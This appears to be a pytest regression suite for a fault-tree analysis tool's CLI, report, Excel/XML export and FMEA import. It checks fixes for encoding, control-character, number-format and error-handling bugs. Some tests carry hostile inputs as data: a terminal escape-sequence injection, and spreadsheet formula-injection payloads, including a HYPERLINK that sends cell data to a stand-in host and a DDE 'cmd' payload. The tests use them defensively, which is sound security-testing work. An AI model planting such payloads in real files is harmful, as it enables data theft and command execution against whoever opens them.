"""Regression tests for the 2026-10 review of import/export, the CLI, the
DOCX report, the Excel export and the FMEA import (finding prefix IO-).

Each test failed before its fix.
"""
import csv
import io
import json
import os
import subprocess
import sys
from pathlib import Path

import pytest

from fta_web import cli

REPO = Path(__file__).resolve().parents[2]
RUN = REPO / "fta_web" / "run.py"


def write_doc(path, tree=None, title="Doc", mode="FTA", **extra):
    doc = {"title": title, "date": "2026-01-01", "mode": mode, "tree": tree or {
        "id": "root", "name": "Top", "type": "Root", "logicGate": "OR", "children": [
            {"id": "a", "name": "Pump ü", "probability": 0.01, "children": []},
            {"id": "b", "name": "Valve", "probability": 0.02, "children": []},
        ]}}
    doc.update(extra)
    path.write_text(json.dumps(doc), encoding="utf-8")
    return path


def run_cli(*args, encoding):
    """The real entry point with stdout in ``encoding`` (not UTF-8 mode)."""
    env = dict(os.environ, PYTHONIOENCODING=encoding)
    env.pop("PYTHONUTF8", None)
    proc = subprocess.run([sys.executable, str(RUN)] + [str(a) for a in args],
                          capture_output=True, cwd=str(REPO), env=env, timeout=120)
    return proc.returncode, proc.stdout, proc.stderr.decode("utf-8", "replace")


# ---- IO-1: a console that cannot encode a character ----------------------------------


@pytest.mark.parametrize("encoding", ["ascii", "cp932"])
def test_cli_survives_a_console_that_cannot_encode_the_output(tmp_path, encoding):
    """'ü' (not in cp932) or the '—' of an empty cell crashed the write with
    UnicodeEncodeError: a traceback and exit 1 for a run that succeeded."""
    doc = write_doc(tmp_path / "t.json")
    code, out, err = run_cli("quantify", doc, encoding=encoding)
    assert code == 0, err
    assert "Traceback" not in err and b"Pump" in out

    code, out, err = run_cli("quantify", doc, "--json", encoding=encoding)
    assert code == 0, err
    # Still valid JSON, and lossless: non-ASCII is escaped, not replaced.
    payload = json.loads(out.decode("ascii"))
    assert payload["results"]["events"][0]["name"] == "Pump ü"


def test_cli_exit_code_3_survives_a_non_ascii_file_name(tmp_path):
    """The documented 'unreadable file' code was lost to the crash (exit 1)."""
    code, _out, err = run_cli("validate", tmp_path / "nö.json", encoding="ascii")
    assert code == 3, err
    assert "Traceback" not in err


# ---- IO-2: --json is strict JSON ------------------------------------------------------


def _strict_json(text):
    def refuse(token):
        raise ValueError("non-standard JSON token %s" % token)

    return json.loads(text, parse_constant=refuse)


def test_cli_json_has_no_nan_tokens(tmp_path, capsys):
    """A probability of NaN (Python's json reads the bare literal) reached the
    summary and was printed as ``NaN``, which JSON.parse, jq and every strict
    parser reject. It is null now, as in the API's responses."""
    tree = {"id": "root", "name": "Top", "type": "Root", "logicGate": "OR", "children": [
        {"id": "a", "name": "A", "probability": float("nan"), "children": []},
        {"id": "b", "name": "B", "probability": 0.1, "children": []}]}
    doc = write_doc(tmp_path / "nan.json", tree)
    assert cli.main(["quantify", str(doc), "--json"]) == 0
    payload = _strict_json(capsys.readouterr().out)
    assert payload["results"]["summary"]["treeWalk"] is None

    out = tmp_path / "res.json"
    assert cli.main(["quantify", str(doc), "--json", "--out", str(out)]) == 0
    _strict_json(out.read_text(encoding="utf-8"))


# ---- IO-3: --top applies to --json --------------------------------------------------------


def test_cutsets_top_applies_to_json(tmp_path, capsys):
    """``--top N`` cut the text and CSV tables (and importance's JSON) but
    ``cutsets --json`` still listed every cut set."""
    tree = {"id": "root", "name": "Top", "type": "Root", "logicGate": "OR", "children": [
        {"id": "e%d" % i, "name": "E%d" % i, "probability": 0.001 * (i + 1), "children": []}
        for i in range(5)]}
    doc = write_doc(tmp_path / "five.json", tree)
    assert cli.main(["cutsets", str(doc), "--top", "2", "--json"]) == 0
    results = json.loads(capsys.readouterr().out)["results"]
    assert [c["rank"] for c in results["cutSets"]] == [1, 2]
    assert results["cutSets"][0]["events"][0]["id"] == "e4"  # the most probable
    assert results["total"] == 5  # the totals still describe the whole list
    assert cli.main(["cutsets", str(doc), "--top", "2", "--csv"]) == 0
    assert len(list(csv.DictReader(io.StringIO(capsys.readouterr().out)))) == 2


# ---- IO-4: an output that cannot be written -------------------------------------------


def test_unwritable_out_is_an_error_message_not_a_traceback(tmp_path, capsys):
    """``--out`` under a regular file (or any OSError while writing) escaped
    main() as FileExistsError / NotADirectoryError with a traceback."""
    doc = write_doc(tmp_path / "t.json")
    blocker = tmp_path / "taken.txt"
    blocker.write_text("not a folder", encoding="utf-8")
    assert cli.main(["quantify", str(doc), "--json", "--out", str(blocker / "r.json")]) == 1
    err = capsys.readouterr().err
    assert "cannot write" in err and "r.json" in err


def test_report_that_cannot_be_written_fails_that_file_only(tmp_path, capsys):
    pytest.importorskip("docx")
    good = write_doc(tmp_path / "good.json")
    blocker = tmp_path / "taken.txt"
    blocker.write_text("not a folder", encoding="utf-8")
    # A non-.docx --out is a folder; here it names an existing file.
    code = cli.main(["report", str(good), "--out", str(blocker), "--sections", "metadata",
                     "--json"])
    assert code == 1
    captured = capsys.readouterr()
    assert "cannot write" in captured.err
    assert "cannot write" in json.loads(captured.out)["error"]


# ---- IO-19: terminal control sequences from a file -------------------------------------


def test_text_output_does_not_pass_escape_sequences_to_the_terminal(tmp_path, capsys):
    """A name from a crafted file reached the terminal raw: ESC]0;…BEL sets
    the window title, ESC[2J clears the screen (and can fake output)."""
    tree = {"id": "root", "name": "Top", "type": "Root", "logicGate": "OR", "children": [
        {"id": "a", "name": "A\x1b]0;pwned\x07\x1b[2J", "probability": 0.1, "children": []}]}
    doc = write_doc(tmp_path / "esc.json", tree, title="T\x1b[31m")
    assert cli.main(["quantify", str(doc)]) == 0
    out = capsys.readouterr().out
    assert "\x1b" not in out and "\x07" not in out
    assert "A\\x1b]0;pwned\\x07\\x1b[2J" in out and "T\\x1b[31m" in out
    # Machine-readable output keeps the data exactly.
    assert cli.main(["quantify", str(doc), "--json"]) == 0
    assert json.loads(capsys.readouterr().out)["results"]["events"][0]["name"] == tree[
        "children"][0]["name"]


# ---- IO-8: characters XML cannot hold (xlsx, xml, docx) ---------------------------------


def control_char_tree():
    """Text a user can really produce: PowerPoint's soft line break (\\x0b)
    pasted into notes or evidence, a Word cell mark (\\x07), a hand-edited
    or third-party file with \\x01 in a name."""
    return {"id": "root", "name": "Top", "type": "Root", "logicGate": "OR", "children": [
        {"id": "a", "name": "Pump\x01A", "probability": 0.1, "notes": "Seal\x0bcheck",
         "children": [], "trace": {"evidence": "TR-1\x07", "owner": "Ann\x0bLee"},
         "quant": {"model": "fixed", "source": "OREDA\x00"}},
        {"id": "b", "name": "Valve", "probability": 0.2, "children": [],
         "links": [{"target_id": "a", "relation": "OR"}]},
    ]}


def control_char_core(title="Plant\x03"):
    from fta_web.engine import WebCore

    core = WebCore()
    core.set_data(control_char_tree())
    core.set_metadata(title=title, date="2026-01-01", mode="FTA")
    core.recalculate_probabilities()
    return core


def test_xml_text_drops_what_xml_cannot_hold():
    from fta_web.excel_events import xml_text

    assert xml_text("a\x01b\x00c\ud800d￾") == "abcd"
    # whitespace-like controls become a space, as sanitize_name makes them
    assert xml_text("Seal\x0bcheck\x0cnow\x1fx") == "Seal check now x"
    assert xml_text("tab\tnl\ncr\r é λ 日本") == "tab\tnl\ncr\r é λ 日本"
    assert xml_text(None) == "" and xml_text(12) == "12"


def test_xlsx_export_survives_control_characters(tmp_path):
    """The core's FTA sheet raised IllegalCharacterError (500); the Events
    sheet's failure was even reported as 'openpyxl is not installed' (503)."""
    openpyxl = pytest.importorskip("openpyxl")
    from fta_web.excel_events import EVENT_HEADERS, export_xlsx

    core = control_char_core()
    path = tmp_path / "x.xlsx"
    ok, error = export_xlsx(core, str(path))
    assert ok, error
    wb = openpyxl.load_workbook(path)
    fta = [c.value for row in wb["FTA"].iter_rows() for c in row if c.value]
    assert any(v.startswith("PumpA\n") and "Notes: Seal check" in v for v in fta)
    events = wb["Events"]
    col = {h: i + 1 for i, h in enumerate(EVENT_HEADERS)}
    assert events.cell(row=3, column=col["Name"]).value == "PumpA"
    assert events.cell(row=3, column=col["Evidence"]).value == "TR-1"
    assert events.cell(row=3, column=col["Owner"]).value == "Ann Lee"
    assert events.cell(row=3, column=col["Source"]).value == "OREDA"
    analysis = {r[0].value: r[1].value for r in wb["Analysis"].iter_rows(min_row=2)}
    assert analysis["Title"] == "Plant"
    # The export reads the document; it never edits it.
    assert core.find_node_by_id("a")["name"] == "Pump\x01A"
    assert core.find_node_by_id("a")["notes"] == "Seal\x0bcheck"


@pytest.fixture
def files_client(tmp_path):
    import flask

    from fta_web.routes.files import files_bp
    from fta_web.routes.report import report_bp
    from fta_web.routes.tree import tree_bp
    from fta_web.state import get_state, reset_state

    reset_state()
    app = flask.Flask(__name__)
    for bp in (tree_bp, files_bp, report_bp):
        app.register_blueprint(bp)
    get_state().fs_root = tmp_path
    with app.test_client() as client:
        yield client


def open_doc(client, path):
    response = client.post("/api/file/open", json={"path": str(path)})
    assert response.status_code == 200, response.get_data(as_text=True)


def test_xml_export_is_well_formed_with_control_characters(files_client, tmp_path):
    """ElementTree wrote the raw \\x01 / \\x0b into the file: a 200 download
    that no XML parser accepts ('not well-formed (invalid token)')."""
    import xml.etree.ElementTree as ET

    open_doc(files_client, write_doc(tmp_path / "c.json", control_char_tree()))
    response = files_client.get("/api/export/xml")
    assert response.status_code == 200
    root = ET.fromstring(response.get_data())
    pump = root.find("Node").find("Node")
    assert pump.get("name") == "PumpA"
    assert pump.find("Notes").text == "Seal check"
    link = root.find("Node").findall("Node")[1].find("Links").find("Link")
    assert link.text == "PumpA"


def test_xml_export_of_non_string_type_and_notes(files_client, tmp_path):
    """A hand-edited ``"type": 5`` / ``"notes": 5`` made ElementTree raise
    'cannot serialize 5' (500)."""
    import xml.etree.ElementTree as ET

    tree = {"id": "root", "name": "Top", "type": None, "logicGate": "OR", "children": [
        {"id": "a", "name": "A", "type": 5, "notes": 7, "probability": 0.1, "children": []}]}
    open_doc(files_client, write_doc(tmp_path / "t.json", tree))
    response = files_client.get("/api/export/xml")
    assert response.status_code == 200, response.get_data(as_text=True)
    node = ET.fromstring(response.get_data()).find("Node").find("Node")
    assert node.get("type") == "5" and node.find("Notes").text == "7"


def test_export_view_leaves_an_ordinary_document_byte_identical(tmp_path):
    from fta_web.engine import WebCore
    from fta_web.excel_events import export_view

    core = WebCore()
    ok, error = core.load_from_json(str(REPO / "fta_web" / "examples" / "sampleFTA.json"))
    assert ok, error
    core.find_node_by_id("root")["notes"] = "Ünïcode <&> \"quotes\"\nline 2\ttab"
    plain, viewed = tmp_path / "plain.xml", tmp_path / "view.xml"
    assert core.export_to_xml(str(plain))[0] and export_view(core).export_to_xml(str(viewed))[0]
    assert plain.read_bytes() == viewed.read_bytes()


def docx_text(blob):
    docx = pytest.importorskip("docx")
    document = docx.Document(io.BytesIO(blob))
    parts = [p.text for p in document.paragraphs]
    for table in document.tables:
        parts.extend(cell.text for row in table.rows for cell in row.cells)
    return "\n".join(parts)


def test_docx_report_survives_control_characters():
    """python-docx raised 'All strings must be XML compatible' on the first
    such character in any name, trace field, source or the title: the
    report route answered 500 and the CLI printed a traceback."""
    pytest.importorskip("docx")
    from fta_web import report_docx

    core = control_char_core()
    core.find_node_by_id("b")["name"] = "Valve\ud800"  # a lone surrogate from a broken file
    options = {"sections": list(report_docx.SECTIONS)}
    data = report_docx.collect_report_data(core, [], options)
    text = docx_text(report_docx.build_report(data, options))
    assert "Plant" in text and "PumpA" in text and "TR-1" in text and "Ann Lee" in text
    assert "OREDA" in text and "Valve" in text


def test_docx_report_with_a_numeric_title(files_client, tmp_path):
    """``"title": 123`` in a file: build_report's heading raised TypeError and
    the route's download name did ``123 + "_report"`` (500)."""
    pytest.importorskip("docx")
    doc = write_doc(tmp_path / "n.json", title=123)
    upload = {"file": (io.BytesIO(doc.read_bytes()), "n.json")}
    assert files_client.post("/api/import/json", data=upload,
                             content_type="multipart/form-data").status_code == 200
    response = files_client.post("/api/report/docx", json={"sections": ["metadata"]})
    assert response.status_code == 200, response.get_data(as_text=True)
    assert "123_report.docx" in response.headers["Content-Disposition"]
    assert "123" in docx_text(response.get_data())


def test_xlsx_export_writes_text_never_formulas(tmp_path):
    """openpyxl stores any string that starts with '=' as a formula: a node
    named '=HYPERLINK(...)' (from a supplier's tree or FMEA sheet) became a
    live link in the Events sheet, '=1+1' showed as 2, and the core's FTA
    cell ('=...' + '\\n(Type: ...)') was a broken formula Excel 'repairs'."""
    openpyxl = pytest.importorskip("openpyxl")
    from fta_web.engine import WebCore
    from fta_web.excel_events import EVENT_HEADERS, export_xlsx

    evil = '=HYPERLINK("http://example.invalid/?x="&A2,"Click")'
    tree = {"id": "root", "name": "Top", "type": "Root", "logicGate": "OR", "children": [
        {"id": "a", "name": evil, "probability": 0.1, "children": [],
         "trace": {"requirementId": "=1+1", "tags": ["=2+2"]},
         "fmea": {"id": "=F1", "cause": "=cmd|' /C calc'!A0"}},
        {"id": "b", "name": "Valve", "probability": 0.2, "children": []}]}
    core = WebCore()
    core.set_data(tree)
    core.set_metadata(title="=SUM(1,2)", date="2026-01-01", mode="FTA")
    core.recalculate_probabilities()
    path = tmp_path / "f.xlsx"
    ok, error = export_xlsx(core, str(path))
    assert ok, error
    wb = openpyxl.load_workbook(path)
    for ws in wb.worksheets:
        formulas = [c.coordinate for row in ws.iter_rows() for c in row if c.data_type == "f"]
        assert formulas == [], (ws.title, formulas)
    events = wb["Events"]
    col = {h: i + 1 for i, h in enumerate(EVENT_HEADERS)}
    assert events.cell(row=3, column=col["Name"]).value == evil
    assert events.cell(row=3, column=col["Requirement ID"]).value == "=1+1"
    assert events.cell(row=3, column=col["FMEA cause"]).value == "=cmd|' /C calc'!A0"
    fta_cells = [c.value for row in wb["FTA"].iter_rows() for c in row if c.value]
    assert any(v.startswith(evil + "\n(") for v in fta_cells)
    analysis = {r[0].value: r[1].value for r in wb["Analysis"].iter_rows(min_row=2)}
    assert analysis["Title"] == "=SUM(1,2)"


def test_xlsx_sheet_failure_is_not_reported_as_missing_openpyxl(files_client, tmp_path,
                                                                 monkeypatch):
    """Every failure while adding the Events/Analysis sheets carried
    '(openpyxl)' in its message, which the route reads as 'openpyxl broke
    on use': a full disk was answered 503 'Excel export needs the openpyxl
    package, which is not installed'."""
    pytest.importorskip("openpyxl")
    from fta_web import excel_events

    def disk_full(*_args, **_kwargs):
        raise OSError(28, "No space left on device")

    open_doc(files_client, write_doc(tmp_path / "d.json"))
    monkeypatch.setattr(excel_events, "_write_events", disk_full)
    response = files_client.get("/api/export/xlsx")
    error = response.get_json()["error"]
    assert response.status_code == 500, error
    assert "No space left on device" in error["message"]
    assert "not installed" not in error["message"]


FMEA_TEXT = "ID,Item,Failure Mode,Rate\nF-1,Pumpe,Défaut d'étanchéité,1e-6\nF-2,弁,固着,2e-6\n"
FMEA_ROWS = [["F-1", "Pumpe", "Défaut d'étanchéité", "1e-6"], ["F-2", "弁", "固着", "2e-6"]]


@pytest.mark.parametrize("encoding, bom, delimiter", [
    ("utf-16", b"", ","),             # Python's utf-16 writes the LE BOM
    ("utf-16", b"", "\t"),            # Excel's "Unicode Text"
    ("utf-16-be", b"\xfe\xff", ","),
])
def test_fmea_csv_in_utf16(tmp_path, encoding, bom, delimiter):
    """A UTF-16 file (BOM) fell through to latin-1: headers like 'ÿþI\\x00D\\x00',
    NULs in every value, and for tab-separated text a single column."""
    from fta_web import fmea_import

    path = tmp_path / "u16.csv"
    path.write_bytes(bom + FMEA_TEXT.replace(",", delimiter).encode(encoding))
    table = fmea_import.read_table(path)
    assert table["columns"] == ["ID", "Item", "Failure Mode", "Rate"]
    assert table["rows"] == FMEA_ROWS


@pytest.mark.parametrize("text, expected", [
    ("1.200,5", 1200.5),          # was 1.2005
    ("1.234.567,8", 1234567.8),   # was rejected
    ("-12.345,25", -12345.25),
    ("1.200,5e-3", 1.2005),
    # unchanged
    ("1,200.5", 1200.5), ("1,5", 1.5), ("1.5", 1.5), ("2,0e-6", 2e-6), ("1e-6", 1e-6),
    ("1 000", 1000.0), ("1.2e-6,", 1.2e-6),
])
def test_fmea_number_with_european_grouping(text, expected):
    from fta_web import fmea_import

    assert fmea_import._number(text) == pytest.approx(expected, rel=1e-15)


def test_fmea_lambda_with_european_grouping_is_not_divided_by_1000(tmp_path):
    """A FIT column formatted '#.##0,0' in a European Excel: 1.200,5 FIT was
    imported as 1.2005 FIT -- a failure rate 1000 times too low, silently."""
    from fta_web import fmea_import

    path = tmp_path / "eu.csv"
    path.write_text("ID;Mode;Lambda (FIT)\nA;Leak;1.200,5\n", encoding="utf-8")
    table = fmea_import.read_table(path)
    tree = {"id": "root", "name": "Top", "type": "Root", "probability": 1.0,
            "logicGate": "OR", "notes": "", "links": [], "children": []}
    result = fmea_import.apply_import(
        tree, table["rows"], {"id": "ID", "mode": "Mode", "lambda": "Lambda (FIT)"}, "root",
        {}, "eu.csv", lambda_unit="FIT", columns=table["columns"])
    assert result["created"] == ["root_0"]
    assert tree["children"][0]["quant"]["lambda"] == pytest.approx(1.2005e-6, rel=1e-12)


def _xlsx_with_dimension(path, ref):
    """A workbook whose sheet XML declares ``<dimension ref=ref/>``, as some
    exporters write it regardless of the data."""
    import re
    import zipfile

    openpyxl = pytest.importorskip("openpyxl")
    book = openpyxl.Workbook()
    sheet = book.active
    sheet.append(["ID", "Item", "Mode", "Rate"])
    sheet.append(["F-1", "Pump", "Leak", 1e-6])
    sheet.append([None, None, None, None])
    sheet.append(["F-2", "Valve", "Stuck", 2e-6])
    plain = path.with_suffix(".plain.xlsx")
    book.save(plain)
    with zipfile.ZipFile(plain) as zin, zipfile.ZipFile(path, "w") as zout:
        for item in zin.infolist():
            data = zin.read(item.filename)
            if item.filename == "xl/worksheets/sheet1.xml":
                data = re.sub(rb'<dimension ref="[^"]*"/>',
                              b'<dimension ref="%s"/>' % ref.encode(), data)
            zout.writestr(item, data)
    return path


def test_fmea_xlsx_with_a_wrong_dimension_record(tmp_path):
    """openpyxl's read-only mode trusts the sheet's declared dimension: with
    'A1' (written by some exporters) the table was just the 'ID' header --
    every row silently missing."""
    from fta_web import fmea_import

    path = _xlsx_with_dimension(tmp_path / "dim.xlsx", "A1")
    table = fmea_import.read_table(path)
    assert table["columns"] == ["ID", "Item", "Mode", "Rate"]
    assert table["rows"] == [["F-1", "Pump", "Leak", 1e-6], ["F-2", "Valve", "Stuck", 2e-6]]
    assert table["rowNumbers"] == [2, 4]


def _xlsx_with_a_chart_sheet_first(path):
    openpyxl = pytest.importorskip("openpyxl")
    from openpyxl.chart import BarChart, Reference

    book = openpyxl.Workbook()
    data = book.active
    data.title = "FMEA"
    data.append(["ID", "Mode", "Occurrence"])
    data.append(["A", "Leak", 4])
    chart = BarChart()
    chart.add_data(Reference(data, min_col=3, min_row=1, max_row=2), titles_from_data=True)
    book.create_chartsheet("Pareto", 0).add_chart(chart)
    book.save(path)
    return path


def test_fmea_xlsx_whose_first_sheet_is_a_chart(tmp_path):
    """The first sheet is the default, and a chart sheet has no cells:
    AttributeError ('Chartsheet' object has no attribute 'iter_rows') -- the
    preview was a 500 before the sheet list could even be shown."""
    from fta_web import fmea_import

    path = _xlsx_with_a_chart_sheet_first(tmp_path / "chart.xlsx")
    table = fmea_import.read_table(path)
    assert table["sheets"] == ["FMEA"] and table["sheet"] == "FMEA"
    assert table["rows"] == [["A", "Leak", 4]]
    with pytest.raises(fmea_import.FmeaImportError) as info:
        fmea_import.read_table(path, "Pareto")
    assert info.value.reason == "unknown_sheet"


def test_fmea_import_ids_are_the_desktop_ids():
    """Same ids as tree_ops.next_child_id gives one by one: past the highest
    sibling index, stepping over an id taken elsewhere in the tree."""
    from fta_web import fmea_import

    tree = {"id": "root", "name": "Top", "type": "Root", "probability": 1.0, "children": [
        {"id": "root_0", "name": "a", "probability": 0.1, "children": [
            {"id": "root_7", "name": "moved here", "probability": 0.1, "children": []}]},
        {"id": "root_5", "name": "b", "probability": 0.1, "children": []}]}
    rows = [["N%d" % i, "Mode%d" % i] for i in range(3)]
    result = fmea_import.apply_import(tree, rows, {"id": "ID", "mode": "Mode"}, "root", {}, "x",
                                      columns=["ID", "Mode"])
    assert result["created"] == ["root_6", "root_8", "root_9"]


def test_fmea_import_of_the_maximum_sheet_is_not_quadratic():
    """Each new row walked the whole tree twice (find the parent, collect
    every id): 20,000 rows -- the documented maximum -- took 81 s inside
    the state lock, freezing the whole app."""
    import time

    from fta_web import fmea_import

    tree = {"id": "root", "name": "Top", "type": "Root", "probability": 1.0, "children": []}
    rows = [["F-%d" % i, "Mode%d" % i, 1e-6] for i in range(fmea_import.MAX_ROWS)]
    started = time.perf_counter()
    result = fmea_import.apply_import(tree, rows, {"id": "ID", "mode": "Mode", "lambda": "Rate"},
                                      "root", {}, "x", columns=["ID", "Mode", "Rate"])
    elapsed = time.perf_counter() - started
    assert len(result["created"]) == fmea_import.MAX_ROWS
    assert result["created"][-1] == "root_%d" % (fmea_import.MAX_ROWS - 1)
    assert elapsed < 20.0, elapsed


def test_docx_route_with_control_characters(files_client, tmp_path):
    pytest.importorskip("docx")
    open_doc(files_client, write_doc(tmp_path / "c.json", control_char_tree(), title="T\x02"))
    response = files_client.post("/api/report/docx", json={})
    assert response.status_code == 200, response.get_data(as_text=True)[:300]
